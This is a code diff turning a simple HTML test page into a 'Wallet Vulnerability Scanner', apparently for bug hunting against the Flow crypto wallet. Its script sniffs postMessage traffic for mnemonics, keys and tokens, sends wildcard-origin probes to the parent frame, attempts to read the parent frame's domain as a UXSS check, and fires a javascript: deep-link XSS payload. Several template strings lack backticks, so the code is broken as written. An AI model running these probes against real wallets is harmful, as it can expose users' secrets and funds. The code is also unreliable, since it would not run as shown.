@@ -1,35 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Bug Hunter Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Audit - Wallet Flow</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; }
-        #status { color: red; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; line-height: 1.6; background-color: #f4f4f9; }
+        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h3 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        .log-box { background: #222; color: #0f0; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; height: 300px; overflow-y: scroll; margin-bottom: 20px; }
+        .found { color: #ff00ff; font-weight: bold; background: #440044; padding: 2px 5px; }
+        .critical { color: #fff; background: #ff0000; padding: 2px 5px; font-weight: bold; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 10px; }
+        button:hover { background: #0056b3; }
     </style>
 </head>
 <body>
-    <h2>DApp Security Test</h2>
-    <p>Status: <span id="status">Menunggu respon dari Wallet...</span></p>
+    <div class="container">
+        <h3>Wallet Vulnerability Scanner</h3>
+        <div id="log" class="log-box">-- Memulai Pemindaian --<br></div>
+        
+        <button onclick="triggerDeepLink()">Uji Deep Link Bypass</button>
+        <button onclick="location.reload()">Refresh Scan</button>
+    </div>
 
     <script>
-        // 1. Mendengarkan kiriman data dari Flow Wallet
-        window.addEventListener("message", (event) => {
-            // Jika Anda menerima data di sini, periksa event.origin
-            console.log("Data Tertangkap:", event.data);
-            document.getElementById("status").innerText = "Data Diterima: " + JSON.stringify(event.data);
-            
-            // Jika alert muncul dengan domain 'flow.com', ini adalah UXSS/Origin Bypass
-            alert("Origin Pengirim: " + event.origin + "\nData: " + JSON.stringify(event.data));
+        const logElement = document.getElementById('log');
+
+        function writeLog(msg, type = '') {
+            const span = document.createElement('div');
+            span.innerHTML = [${new Date().toLocaleTimeString()}] ${msg};
+            if (type) span.className = type;
+            logElement.appendChild(span);
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        // 1. Deteksi Provider yang Disuntikkan (Injection Detection)
+        const providers = ['fcl', 'flow', 'ethereum', 'solana', 'trustwallet', 'phantom'];
+        providers.forEach(p => {
+            if (window[p] || (window.parent && window.parent[p])) {
+                writeLog(CRITICAL: Provider window.${p} terdeteksi!, 'found');
+            }
         });
 
-        // 2. Mencoba memicu wallet untuk mengirimkan info akun
-        // Kita menggunakan '*' agar pesan dikirim ke mana saja (uji celah keamanan)
-        setTimeout(() => {
-            if (window.parent !== window) {
-                window.parent.postMessage({ type: 'FCL:VIEW:READY' }, '*'); 
-                // FCL adalah standar Flow Client Library
+        // 2. Cek Keamanan Iframe (UXSS/Origin Check)
+        if (window.top !== window.self) {
+            writeLog("Info: Berjalan di dalam Iframe.");
+            try {
+                const parentDomain = window.top.document.domain;
+                writeLog(VULNERABLE: Berhasil akses domain induk: ${parentDomain}, 'critical');
+                alert("UXSS Success! Domain: " + parentDomain);
+            } catch(e) {
+                writeLog("Akses domain induk diblokir (Cross-Origin Policy Aktif).");
             }
+        }
+
+        // 3. Listener untuk Kebocoran Data (PostMessage sniffing)
+        window.addEventListener("message", (event) => {
+            writeLog(Pesan masuk dari: ${event.origin});
+            const dataStr = JSON.stringify(event.data).toLowerCase();
+            
+            // Mencari kata kunci sensitif
+            const sensitive = ['address', 'token', 'key', 'mnemonic', 'secret', 'auth'];
+            sensitive.forEach(word => {
+                if (dataStr.includes(word)) {
+                    writeLog(SENSITIVE DATA LEAK: Found "${word}" in message!, 'critical');
+                    console.log("Full Data:", event.data);
+                }
+            });
+        });
+
+        // 4. Memancing Respon (Probing)
+        const probes = [
+            { type: 'FCL:VIEW:READY' },
+            { type: 'fcl:ready' },
+            { method: 'getAccounts' },
+            { type: 'FLOW::CHALLENGE' }
+        ];
+
+        setTimeout(() => {
+            writeLog("Mengirim probe ke wallet...");
+            probes.forEach(p => {
+                window.parent.postMessage(p, '*');
+            });
         }, 2000);
+
+        // 5. Deep Link Test
+        function triggerDeepLink() {
+            writeLog("Memicu Deep Link Test...");
+            // Menguji apakah wallet mengeksekusi JS dari skema URL
+            window.location.href = "flow://open?url=javascript:alert('DeepLink_XSS_Success')";
+        }
     </script>
 </body>
 </html>
